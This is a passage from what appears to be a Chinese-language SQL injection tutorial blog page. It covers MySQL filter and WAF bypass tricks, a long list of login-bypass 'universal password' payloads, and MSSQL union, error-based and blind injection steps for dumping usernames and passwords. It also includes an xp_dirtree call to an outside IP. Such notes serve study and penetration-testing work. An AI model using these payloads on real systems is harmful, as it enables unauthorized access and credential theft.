</p></li><li><p>@@user&#x3D;&#x3D;&gt;user() </p></li><li><p>@@datadir&#x3D;&#x3D;&gt;datadir()</p><p>@表示用户变量，@@表示系统变量</p></li></ul><h3 id="引号过滤绕过"><a href="#引号过滤绕过" class="headerlink" title="引号过滤绕过"></a>引号过滤绕过</h3><p>适用<strong>十六进制绕过</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">=</span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><p><strong>一般逗号在盲注中比较常见</strong></p><p><strong>使用from关键字绕过</strong>：对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from for</code>的方式来解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure><p><strong>使用join绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p><strong>使用offset绕过：对于limit可以使用offset来绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure><blockquote><p>需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行</p></blockquote><p><strong>使用like绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure><h3 id="过滤了union，select，where"><a href="#过滤了union，select，where" class="headerlink" title="过滤了union，select，where"></a>过滤了union，select，where</h3><p>注释符绕过：**<code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code>**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION /**/ SE/**/LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure><p>大小写绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure><p>内联注释绕过：<strong>把一些特有的仅在MySQL上的语句放在&#x2F;!…&#x2F;中</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure><h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h3><p>原理：</p><p>原验证登陆语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure><p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>优先级关系：or&lt;and&lt;not</p><p><strong><code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>为假，而<code>Username=&#39;1&#39; OR 1=1</code>肯定为真，所以整体为真</strong></p></blockquote><p><strong>万能密码</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h3 id="MySQL黑魔法绕过"><a href="#MySQL黑魔法绕过" class="headerlink" title="MySQL黑魔法绕过"></a>MySQL黑魔法绕过</h3><p>原理就是利用MySQL<strong>解析特性绕过过滤规则</strong>的技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and&#123;a 1=1&#125; and&#123;a 1=2&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#123;&#125;</code>：MySQL中通常用于标识变量或存储过程代码块，但在普通查询中可能被部分解析器忽略。</p><p><code>a</code>：无实际意义的占位符，用于绕过简单关键词过滤（如检测<code>1=</code>）</p></blockquote><p>若 <code>&#123;&#125;</code> 或 <code>a</code> 无法被解析，可能被静默忽略。</p><p>实际等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AND 1=1   -- 恒真</span><br><span class="line">AND 1=2   -- 恒假</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(database()=&#x27;Security&#x27;, &#123;a 1=1&#125;, &#123;a 1=2&#125;) --+ </span><br></pre></td></tr></table></figure><h3 id="HTTP参数污染绕过"><a href="#HTTP参数污染绕过" class="headerlink" title="HTTP参数污染绕过"></a>HTTP参数污染绕过</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><p>其原理就是当浏览器在跟服务器进行交互过程中，浏览器往往会在GET&#x2F;POST请求里带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中允许同样名称的参数多次出现，如：<code>http://www.baidu.com/?name=aa&amp;name=bb</code>。而针对这种情况，不同的服务器处理的方式会不一样，有的服务器是取第一个参数，即<code>name=aa</code>，有的服务器是取第二个参数<code>name=bb</code>，有的服务器两个参数都取，即<code>name=aa,bb</code>，而这种waf绕过一些服务器端的逻辑判断时非常有用。</p><p><strong>HPP参数污染</strong>可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/index.asp?page=select 1,2,3 from table where id=1</span><br><span class="line"></span><br><span class="line">http://www.baidu.com/index.asp?page=select 1&amp;page=2,3 from table where id=1</span><br></pre></td></tr></table></figure><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择：</p><p><img src="/archives/ef8ae29c/1628845374145-fcc0997e-96c2-4bcf-9644-57db93d3a475.png"></p><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果</p><p>以参数color&#x3D;red&amp;color&#x3D;blue为例:</p><p><img src="/archives/ef8ae29c/1628844984291-02f867a8-634a-40bd-a5f5-5f9d95097a5a.png"></p><h2 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h2><h3 id="sql-server-mssql-注入"><a href="#sql-server-mssql-注入" class="headerlink" title="sql server(mssql)注入"></a>sql server(mssql)注入</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>mssql</code>是指微软的<code>sql server</code>数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属于<strong>关系型数据库</strong>，端口号为<strong>1433</strong>。</p><p>数据库后缀名<code>.mdf</code>，注释符为<code>--</code></p><p><code>sql server</code>数据库有六个默认的库，分别为4个系统数据库：<strong>master 、model 、msdb 、tempdb</strong>，和2个实例数据库：ReportServer、ReportServerTempDB。</p><ul><li><p><strong>master</strong></p><p>用于记录所有 SQL Server 系统级别的信息，这些信息用于控制用户数据库和数据操作。</p><p>这个库也是mssql注入中最终重要的，其中<strong>储存了所有数据库名与存储过程</strong>。类比于mysql中的<code>information_schema</code></p></li><li><p><strong>model</strong></p><p>sql server为用户数据库提供的样板，新的用户数据库都以model数据库为基础</p></li><li><p><strong>msdb</strong></p><p>由Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息</p></li><li><p><strong>tempdb</strong></p><p>它为临时表和其他临时工作提供了一个存储区</p></li></ul><p>以 master 库为例，其中视图表 <code>master.dbo.sysdatabases</code> 储存所有数据库名，其他数据库的视图则储存它本库的表名与列名。每一个库的视图表都有 <code>syscolumns</code> 存储着所有的字段，可编程性储存着我们的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from master.dbo.sysdatabases;</span><br></pre></td></tr></table></figure><p>查询所有数据库的名称。</p><h4 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h4><p>sql server内部按作用范围分有三大主体：</p><ul><li><strong>Windows级别主体</strong></li><li><strong>服务器级别主体</strong></li><li><strong>数据库级别主体</strong></li></ul><p><img src="/archives/ef8ae29c/QQ20250419-210416.png"></p><p>对于<strong>服务器级别</strong>：</p><p>在微软官方文档中可看到，<code>IS_SRVROLEMEMBER ( &#39;role&#39; [ , &#39;login&#39; ] )</code>函数role的有效值是<strong>用户定义的服务器角色</strong>和以下<strong>固定服务器角色</strong>：</p><p><img src="/archives/ef8ae29c/20210120145938.png"></p><table><thead><tr><th>返回值</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>login 不是 role 的成员。</td></tr><tr><td>1</td><td>login 是 role 的成员。</td></tr><tr><td>NULL</td><td>role 或 login 无效，或者没有查看角色成员身份的权限。</td></tr></tbody></table><p>构造语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure><p><strong>sqlmap中可用<code>-is-dba</code>判断是否为管理员权限</strong></p><p>对于<strong>数据库级别</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IS_MEMBER(&#x27;db_owner&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/20210120150401.png"></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><strong>注释符</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">-- </span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><p><strong>空白字符</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br><span class="line"></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure><p>语法定义符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。</span><br><span class="line"></span><br><span class="line">::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。</span><br><span class="line"></span><br><span class="line">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。</span><br><span class="line"></span><br><span class="line">&#123; &#125; 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。</span><br><span class="line"></span><br><span class="line">() 括号是分组运算符</span><br></pre></td></tr></table></figure><h4 id="注入常用参数-1"><a href="#注入常用参数-1" class="headerlink" title="注入常用参数"></a>注入常用参数</h4><h5 id="相关函数和表"><a href="#相关函数和表" class="headerlink" title="相关函数和表"></a>相关函数和表</h5><p>常用函数：</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>db_name()</td><td>返回当前数据库的名称</td></tr><tr><td>host_name()</td><td>返回计算机名称</td></tr><tr><td>current_user</td><td>返回当前数据库的用户名</td></tr><tr><td>substring()</td><td>字符串截取函数</td></tr><tr><td>@@version</td><td>查看数据库版本</td></tr><tr><td>char()</td><td>ASCII 转字符函数</td></tr><tr><td>cast(text as type)</td><td>字符类型转换，如果转换失败会将 text 结果报错显示在页面上</td></tr><tr><td>object_id()</td><td>根据表名返回数据库表名 ID</td></tr><tr><td>object_name()</td><td>根据 ID 返回数据库表名</td></tr><tr><td>col_name(object_id,column_id)</td><td>返回指定表中指定字段(列）的名称</td></tr><tr><td>dbid</td><td>数据库的唯一标识符，如dbid1&#x3D;master</td></tr><tr><td>SUSER_NAME()</td><td>获取当前登录的SQL Server账户</td></tr><tr><td>USER_NAME()</td><td>获取当前数据库用户</td></tr><tr><td>FILE_NAME()</td><td>获取逻辑文件名</td></tr><tr><td>TYPE_NAME()</td><td>获取数据类型名称</td></tr></tbody></table><p><strong>内置系统表:</strong></p><ul><li><p><strong>Sysdatabases 表</strong></p><p>Sysdatabases 表只保存在 master 数据库中，这个表中保存的是所有的库名，主要字段有：name 数据库名</p></li><li><p><strong>Sysobjects表</strong></p><p>SQLServer 中的每个数据库内都有此系统表，存放着数据库所有的表名。</p><p>而在该系统表中对我们有用的有三个字段：<code>NAME</code>字段和<code>XTYPE</code>字段和<code>ID</code>字段</p><ul><li><strong>name就是表名信息</strong></li><li><strong>xtype是代表表的类型，只有两个参数，<code>S</code>代表系统自带表，<code>U</code>代表用户创建的表</strong></li><li><strong>id字段的值用来连接syscolumns表(查列时会用到)</strong></li></ul></li><li><p><strong>Syscolumns 表</strong></p><p>Syscolumns 表位于每个数据库中，存放着数据库所有的字段名。主要字段有：name、id 分别是字段名称、表 ID，其中的 ID 是用 sysobjects 得到的表的 ID 号。</p></li></ul><h5 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h5><ul><li><p><strong>查看数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select @@servername;    #查询服务名</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select db_name(1);      #查询第一个数据库名</span><br><span class="line">select db_name(2);      #查询第二个数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">;select user #查询是否支持多语句</span><br><span class="line">1&#x27; and host_name()=@@servername;-- #判断站库分离</span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">EXEC sp_spaceused @updateusage = N&#x27;TRUE&#x27;;  #查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                #查询指定表名的大小</span><br><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.106.5\xx.txt&#x27;,0,1;</span><br></pre></td></tr></table></figure></li><li><p><strong>判断是否是SA权限</strong></p><p>对于<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-isers)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure></li><li><p><strong>数据库连接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=服务器地址,端口; Database=数据库名; User Id=用户名; Password=密码;</span><br></pre></td></tr></table></figure></li><li><p><strong>查询数据库</strong></p><p><code>master.dbo.sysdatabases</code> 储存所有数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br></pre></td></tr></table></figure></li><li><p><strong>查询数据表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from sysobjects where xtype=&#x27;U&#x27; #查询当前数据库中表的个数</span><br><span class="line">select name from sysobjects where xtype=&#x27;U&#x27;  #查询当前数据库中所有表的名字</span><br><span class="line">select * from sysobjects where xtype=&#x27;U&#x27;    #查询当前数据库的所有表的详细信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..sysobjects where xtype=&#x27;U&#x27;  #查询指定test数据库中表的个数</span><br><span class="line">select name from test..sysobjects where xtype=&#x27;U&#x27;         #查询指定test数据库中表的名字</span><br><span class="line">select * from test..sysobjects where xtype=&#x27;U&#x27;            #查询指定test数据库中表的详细信息</span><br></pre></td></tr></table></figure><blockquote><p><code>..</code>表示默认架构dbo</p></blockquote></li><li><p><strong>查询列</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)     #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br></pre></td></tr></table></figure><blockquote><p>一般每个表名在 <code>sysobjects</code> 中唯一，<code>name=&#39;users&#39;</code> 应仅返回一条记录。使用 <code>MAX(id)</code> 是一种防御性写法，防止意外情况下多条记录导致错误。</p></blockquote></li><li><p><strong>查询数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from test..users          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..users                 #查询test数据库user表的所有数据</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入姿势-1"><a href="#注入姿势-1" class="headerlink" title="注入姿势"></a>注入姿势</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>mssql联合注入一般不使用数字占位，而是null，因为使用数字占位可能会发生隐式转换</p><p>流程：</p><ul><li><p><strong>判断注入点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1--</span><br></pre></td></tr></table></figure></li><li><p><strong>判断字段数</strong></p><p>一样利用order by判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 5--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select db_name()), null, null --</span><br></pre></td></tr></table></figure><blockquote><p>union all保留所有行，union会删除重复项</p></blockquote></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 name from 库名.dbo.sysobjects where xtype=&#x27;u&#x27;), null,null --</span><br></pre></td></tr></table></figure><blockquote><p>top 1查询前1条数据</p></blockquote></li><li><p><strong>爆字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects), null,null</span><br></pre></td></tr></table></figure><blockquote><p>object_id()：根据表名返回数据库表名id</p><p>col_name(object_id,column_id)：返回指定表中指定字段(列）的名称</p></blockquote></li><li><p><strong>获取数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union all select 1,(select top 1 username from manage),null,null</span><br><span class="line"></span><br><span class="line">union all select 1,(select top 1 password from manage),null,null</span><br></pre></td></tr></table></figure></li></ul><h5 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h5><p>有两种方法：</p><ul><li><p><strong>通过将非数值类型强制转换为数值类型，触发隐式转换报错</strong></p><p>如<code>CAST(USER as int)</code>、<code>convert(int,db_name())</code>、<code>db_name()&gt;0</code>、<code>id=1 and 1=(select top 1 table_name from information_schema.tables);--</code>等等</p></li><li><p><strong>通过聚合函数与 GROUP BY 冲突</strong></p><p>如<code>id=1 group by info.id,info.name having 1=1</code></p></li></ul><p>利用函数：</p><ul><li><p><strong>cast()<strong>：将表达式转换为指定数据类型，</strong>ANSI标准函数</strong>，但无格式化参数。</p><p><code>CAST(USER as int)</code>将user当作int类型处理，触发隐式转换错误</p></li><li><p>**convert()**：用于把⽇期转换为新数据类型的通⽤函数。</p><p><code>convert(int,db_name())</code>，含义是将第二个参数的值转换成第一个参数的int类型。利用MSSQL在转换类型的时候就出错，来爆数据库等信息。</p></li><li><p><strong>quotename()<strong>：默认在要处理的参数左右加上两个中括号，起到</strong>分隔符</strong>的作用，避免出现<strong>sql关键字异常</strong></p><p><code>quotename(name)</code>，给查询出的多个表名、列名加入中括号，或者其他符号为分隔符，进行分割，可使SQL注入结果更清晰。</p></li><li><p>**for xml path(‘’)**：提供查询返回的结果为xml格式，此时返回的相当于一个字符串</p><p>将查询到的数据，通过xml进行显示，path指定xml元素结点（行节点），该语句可以将查询到的所有数据<strong>通过XML进行显示</strong></p></li><li><p><strong>stuff()<strong>：stuff()函数将表中列的内容</strong>横向输出</strong></p><p>stuff(param1, startIndex, length, param2)，将param1中自startIndex(SQL中都是从1开始，而非0)起，删除length个字符，然后用param2替换删掉的字符。</p></li></ul><p>流程：</p><ul><li><p><strong>爆库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and db_name()&gt;0;--</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--+</span><br></pre></td></tr></table></figure><blockquote><p>多个数据库情况下</p></blockquote></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;);--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;admin&#x27;) and name&lt;&gt;&#x27;id&#x27;);--</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=(select top 1 username from admin);--</span><br></pre></td></tr></table></figure></li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>与mysql原理类似</p><p><strong>布尔盲注</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 